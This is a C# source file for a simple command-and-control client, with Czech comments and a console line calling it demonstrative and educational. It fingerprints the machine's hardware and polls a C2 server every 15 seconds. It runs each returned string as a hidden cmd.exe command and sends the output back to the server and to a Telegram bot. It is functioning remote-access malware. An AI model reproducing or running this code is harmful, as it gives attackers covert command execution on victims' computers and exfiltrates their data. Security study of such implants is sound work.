using System;
using System.Net;
using System.Text;
using System.Timers;
using System.Management;
using System.Diagnostics;
using System.Reflection;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types;

namespace C2client
{
    class Program
    {
        private static Timer timer;
        private static string hardwareId;
        static TelegramBotClient botClient;
        private static readonly string chatId = "";
        private static readonly string botToken = "";

        private static void Main()
        {
            // Vygenerování ID hardware
            hardwareId = GenerateHardwareId();

            // Nastavení časovače na 15 sec.
            timer = new Timer(15000);
            timer.Elapsed += OnTimedEvent;
            timer.Start();

            SendMessage("You said:\n");

            Console.WriteLine("Jednoduchy program pro komunikaci s C2 serverem.");
            Console.WriteLine("Program slouzi pouze pro demonstrativni a vzdelávaci ucely.");
            Console.WriteLine("SW verze: " + Assembly.GetExecutingAssembly().GetName().Version);
            Console.WriteLine("HW ID: " + hardwareId);
            Console.WriteLine("Telegram ID: " + chatId);
            Console.WriteLine("Program bezi. Stiskni Enter pro ukonceni.");
            Console.ReadLine();
        }

        private static string GenerateHardwareId()
        {
            // Kombinace informací o základní desce a CPU
            string motherboardId = GetWmiProperty("Win32_BaseBoard", "SerialNumber");
            string cpuId = GetWmiProperty("Win32_Processor", "ProcessorId");
            return motherboardId + cpuId;
        }

        private static string GetWmiProperty(string wmiClass, string wmiProperty)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT {wmiProperty} FROM {wmiClass}");
            foreach (ManagementObject obj in searcher.Get())
            {
                return obj[wmiProperty]?.ToString();
            }
            return string.Empty;
        }

        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            using (WebClient client = new WebClient())
            {
                var data = new System.Collections.Specialized.NameValueCollection();
                data["hardwareId"] = hardwareId;

                // Odeslání POST požadavku
                byte[] response = client.UploadValues("http://URI/c2/checktask.php", "POST", data);
                string responseString = Encoding.UTF8.GetString(response);

                // Zpracování úkolu
                if (!string.IsNullOrEmpty(responseString))
                {
                    Console.WriteLine("\u001b[32mÚkol: " + responseString + "\u001b[0m");

                    SendMessage("Úkol: " + responseString);
                    // Předpokládáme, že úkol je příkaz pro cmd.exe
                    var process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + responseString;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true; // Přidáno pro zachycení chybového výstupu
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

                    process.Start();

                    // Zachycení výstupu
                    string output = process.StandardOutput.ReadToEnd();
                    string errorOutput = process.StandardError.ReadToEnd(); // Zachycení chybového výstupu
                    process.WaitForExit();

                    if (!string.IsNullOrEmpty(errorOutput))
                    {
                        Console.WriteLine("\u001b[31mChyba úkolu: " + errorOutput + "\u001b[0m");
                        SendMessage("Chyba úkolu: " + errorOutput);
                    }
                    else
                    {
                        Console.WriteLine("\u001b[34mVýstup úkolu: " + output + "\u001b[0m");
                        SendMessage("Výstup úkolu: " + output);
                    }

                    // Odeslání výsledku zpět na server
                    var resultData = new System.Collections.Specialized.NameValueCollection();
                    resultData["hardwareId"] = hardwareId;
                    resultData["result"] = !string.IsNullOrEmpty(errorOutput) ? errorOutput : output;
                    client.UploadValues("http://URI/c2/reportresult.php", "POST", resultData);
                }
            }
        }

        public static string SendMessage(string message)
        {
            string retval = string.Empty;
            string url = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={message}";

            using (var webClient = new WebClient())
            {
                retval = webClient.DownloadString(url);
            }
            
            return retval;
        }
    }
}